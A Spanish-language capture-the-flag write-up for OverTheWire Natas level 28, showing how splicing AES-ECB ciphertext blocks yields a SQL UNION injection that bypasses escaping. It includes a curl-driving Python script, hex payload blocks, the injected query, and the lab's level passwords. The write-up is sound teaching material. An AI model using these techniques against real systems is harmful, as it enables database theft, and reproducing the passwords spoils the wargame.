# Natas 28 → 29

## Información del nivel

| Campo | Valor |
|---|---|
| URL | http://natas28.natas.labs.overthewire.org |
| Usuario | natas28 |
| Contraseña | 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj |
| Contraseña obtenida | 31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns |

---

## Reconocimiento

La página presenta un buscador de chistes. Al buscar algo, la URL contiene un parámetro `query` codificado en Base64 con caracteres `+`, `/` y `=` — señales de cifrado AES.

---

## Análisis del cifrado

El servidor construye una query SQL:

```sql
SELECT * FROM jokes WHERE joke LIKE '%INPUT%'
```

Antes de redirigir al buscador, cifra ese string completo con **AES-ECB** y lo envía en la URL como Base64.

### ¿Por qué no funciona SQL injection directo?

Si escribes `aaaaaaaa UNION SELECT password FROM users--` en el buscador, el servidor lo trata como texto literal dentro del `LIKE '%...%'`. MySQL lo busca como una broma que contiene esa frase — no lo ejecuta como UNION.

El flujo del servidor es:
1. Recibe el input
2. Construye el string SQL completo con el input dentro del `LIKE '%...%'`
3. Cifra ese string con AES-ECB
4. Redirige con el ciphertext en la URL
5. `search.php` descifra el ciphertext y ejecuta el SQL

---

## Vulnerabilidad: AES-ECB Block Manipulation

### ¿Qué es AES-ECB?

AES-ECB (Electronic Codebook) cifra cada bloque de 16 bytes **independientemente**. La consecuencia es que bloques iguales de plaintext producen bloques iguales de ciphertext — y se pueden aislar, reutilizar y reordenar.

```
Bloque A cifrado → siempre el mismo ciphertext
Bloque B cifrado → siempre el mismo ciphertext
```

### Descubrimiento de la estructura

Comparando queries con distinta longitud se determinó:

- Los bloques 1 y 2 son siempre idénticos → son el prefix SQL fijo del servidor
- Con 10 `a`s el bloque 3 siempre es el mismo → las 10 `a`s + final del prefix llenan exactamente el bloque 3
- Con 8 `a`s el bloque 3 incluye el suffix `%'` — la query queda cerrada en ese bloque

### Estructura de bloques con 8 a's

```
Bloque 1: SELECT * FROM jo     ← prefix fijo
Bloque 2: kes WHERE joke L     ← prefix fijo
Bloque 3: IKE '%aaaaaaaa%'    ← 8 a's + suffix %' cerrado
Bloque 4: padding
Bloque 5: padding
```

### Estructura de bloques con payload UNION

Input: `aaaaaaaaaa UNION SELECT password FROM users-- `

```
Bloque 1: SELECT * FROM jo     ← prefix fijo
Bloque 2: kes WHERE joke L     ← prefix fijo
Bloque 3: IKE '%aaaaaaaaaa    ← 10 a's llenan el bloque
Bloque 4:  UNION SELECT pa    ← payload SQL
Bloque 5: ssword FROM user    ← payload SQL
Bloque 6: s-- ____________    ← payload SQL
Bloque 7: suffix
Bloque 8: padding
```

---

## Explotación

### Paso 1: Obtener bloques de Query A (8 a's)

```bash
python3 -c "
import subprocess, base64
from urllib.parse import unquote
import re

auth = 'natas28:1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj'
url = 'http://natas28.natas.labs.overthewire.org/index.php'

def get_blocks(inp):
    r = subprocess.run(['curl', '-sv', '-u', auth, url, '-d', f'query={inp}'], capture_output=True, text=True)
    m = re.search(r'query=([^\s]+)', r.stderr)
    return base64.b64decode(unquote(m.group(1)))

A = get_blocks('aaaaaaaa')
B = get_blocks('aaaaaaaaaa UNION SELECT password FROM users-- ')
"
```

### Paso 2: Ensamblar el ciphertext manipulado

```
Bloques 1-2 (prefix fijo) +
Bloque 3 de Query A (contiene %' que cierra la query) +
Bloques 4-8 de Query B (UNION SELECT + suffix + padding)
```

### Paso 3: Enviar el ciphertext ensamblado

```python
payload_hex = '1be82511a7ba5bfd578c0eef466db59c'  # bloque 1
payload_hex += 'dc84728fdcf89d93751d10a7c75c8cf2'  # bloque 2
payload_hex += '453e0020602f4dccd50f0eb7709477c2'  # bloque 3 Query A
payload_hex += '49c7ba5914897b2f40efe9c311888865'  # bloque 4 Query B
payload_hex += '043003a0d0e6d1e3c6e068f0ce764453'  # bloque 5 Query B
payload_hex += '91f8d230c184b350a4a094d77129d8b3'  # bloque 6 Query B
payload_hex += '4257a343daadaaf2c0e3a1d71ce03dd1'  # bloque 7 Query B
payload_hex += '7b7baca655f298a321e90e3f7a60d4d8'  # bloque 8 Query B
```

### Query SQL resultante al descifrar

```sql
SELECT * FROM jokes WHERE joke LIKE '%aaaaaaaa%' UNION SELECT password FROM users-- %'
```

- `%'` del bloque 3 cierra correctamente el LIKE original
- `UNION SELECT password FROM users` inyecta la query maliciosa
- `-- ` comenta el `%'` del suffix final

---

## ¿Por qué el bloque 3 de 8 a's fue clave?

Con 8 `a`s el suffix `%'` cabe dentro del bloque 3 junto con las `a`s. Al tomar ese bloque y pegarlo antes del UNION, la query queda correctamente cerrada sin necesidad de inyectar comillas directamente — evitando el escape de `mysqli_real_escape_string()`.

---

## Conceptos clave

- **AES-ECB**: modo de cifrado que procesa cada bloque independientemente. Bloques iguales de plaintext producen bloques iguales de ciphertext — permite reordenar y reutilizar bloques.
- **ECB Block Manipulation**: ensamblar manualmente bloques cifrados de distintas queries para construir un ciphertext que al descifrarse produzca SQL malicioso.
- **`mysqli_real_escape_string()`**: escapa caracteres especiales para prevenir SQL injection. En este nivel se evita porque el `%'` viene del bloque del servidor, no del input del atacante.
- **PKCS#7 padding**: relleno que completa el último bloque hasta 16 bytes usando el número de bytes faltantes.
- **Alineación de bloques**: la clave del ataque — posicionar el payload SQL en bloques que puedan combinarse limpiamente con el suffix del servidor.
